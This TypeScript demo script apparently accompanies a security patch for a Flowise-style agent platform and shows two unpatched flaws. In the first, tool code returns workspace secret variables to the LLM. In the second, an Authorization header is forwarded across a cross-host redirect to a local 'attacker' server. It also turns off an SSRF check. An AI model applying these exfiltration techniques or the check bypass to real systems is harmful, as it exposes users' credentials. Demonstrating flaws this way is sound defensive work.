/**
 * demo/run-before.ts
 *
 * Demonstrates the BEFORE state — without the Zero-Context Guard.
 *
 * Attack 1: $vars exfiltration via tool output
 *   A Custom Tool with no secretBindings receives $vars in scope.
 *   The tool returns JSON.stringify($vars) — the LLM receives every
 *   workspace variable in plain text.
 *
 * Attack 2: Redirect credential forwarding via legacy HTTP path
 *   The sandbox sends a request to Server A with an Authorization header.
 *   Server A redirects to Server B (the "attacker").
 *   The Authorization header is forwarded to Server B verbatim.
 *
 * Nothing here uses the guard. This is the unpatched behaviour.
 */

// ── Allow localhost for demo (bypass SSRF deny-list) ─────────────────────────
process.env.HTTP_SECURITY_CHECK = 'false'

import * as http from 'http'
import { secureAxiosRequest } from '../packages/components/src/httpSecurity'
import { prepareSandboxVars } from '../packages/components/src/utils'
import { redact } from '../packages/components/src/guardRedact'

// ── Fake secrets built at runtime ─────────────────────────────────────────────
const FAKE_OPENAI_KEY = 'sk-' + 'a'.repeat(24)
const FAKE_DB_PASS = ['my', 'db', 'password', 'xyz', '99999'].join('-')

// ── Mock workspace variables (what $vars would contain) ──────────────────────
const mockVars = [
    { name: 'OPENAI_API_KEY', value: FAKE_OPENAI_KEY, type: 'static' as const },
    { name: 'DB_PASSWORD', value: FAKE_DB_PASS, type: 'static' as const },
    { name: 'APP_NAME', value: 'my-flowise-app', type: 'static' as const }
]

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

function header(title: string) {
    console.log(`\n${'═'.repeat(60)}`)
    console.log(`  ${title}`)
    console.log('═'.repeat(60))
}

function subheader(title: string) {
    console.log(`\n── ${title} ──`)
}

// ─────────────────────────────────────────────────────────────────────────────
async function main() {
    header('BEFORE: no Zero-Context Guard')

    // ── Attack 1: $vars returned directly by tool code ───────────────────────
    subheader('Attack 1 — tool code returns $vars directly')

    const $vars = prepareSandboxVars(mockVars)
    // Simulate: tool code is `return JSON.stringify($vars)`
    const toolOutput = JSON.stringify($vars)

    console.log('  Tool output (what LLM receives as ToolMessage):')
    console.log('  ' + toolOutput)
    console.log()
    console.log('  ⚠️  LLM sees OPENAI_API_KEY =', ($vars as any).OPENAI_API_KEY)
    console.log('  ⚠️  LLM sees DB_PASSWORD    =', ($vars as any).DB_PASSWORD)

    // Confirm redact() with empty resolvedSecrets does NOT catch a custom key
    const afterStaticOnly = redact(toolOutput, [])
    console.log()
    console.log('  After static-pattern redact(output, []) — what SSE trace shows without resolved secrets:')
    console.log('  ' + afterStaticOnly)
    console.log('  ⚠️  DB_PASSWORD still visible in SSE trace (no static pattern for it)')

    // ── Attack 2: redirect credential forwarding ──────────────────────────────
    subheader('Attack 2 — Authorization header forwarded on cross-host redirect')

    // Start mock servers (inline, no mock-servers.js import to keep this standalone)
    const received: Record<string, string> = {}

    const srvB = http.createServer((req, res) => {
        Object.assign(received, req.headers)
        res.writeHead(200)
        res.end('ok')
    })

    await new Promise<void>((r) => srvB.listen(4002, '127.0.0.1', r))

    const srvA = http.createServer((_, res) => {
        res.writeHead(302, { location: 'http://127.0.0.1:4002/collect' })
        res.end()
    })

    await new Promise<void>((r) => srvA.listen(4001, '127.0.0.1', r))

    try {
        // Simulates legacy sandbox code calling secureAxiosRequest directly
        // with a credential in the Authorization header.
        await secureAxiosRequest({
            url: 'http://127.0.0.1:4001/start',
            method: 'GET',
            headers: { Authorization: `Bearer ${FAKE_OPENAI_KEY}` }
        })

        console.log('  Request sent: GET http://127.0.0.1:4001/start')
        console.log('  Server A redirected → http://127.0.0.1:4002/collect (different host/port)')
        console.log()

        if (received.authorization) {
            console.log('  Headers received by attacker server (B):')
            console.log('    authorization:', received.authorization)
            console.log()
            console.log('  ⚠️  CREDENTIAL FORWARDED to redirect destination!')
        } else {
            console.log('  (no Authorization header forwarded — guard is active)')
        }
    } finally {
        srvA.close()
        srvB.close()
    }

    header('END — BEFORE demo complete')
    console.log('  Run demo/after.sh to see the guarded behaviour.\n')
}

main().catch((err) => {
    console.error(err)
    process.exit(1)
})
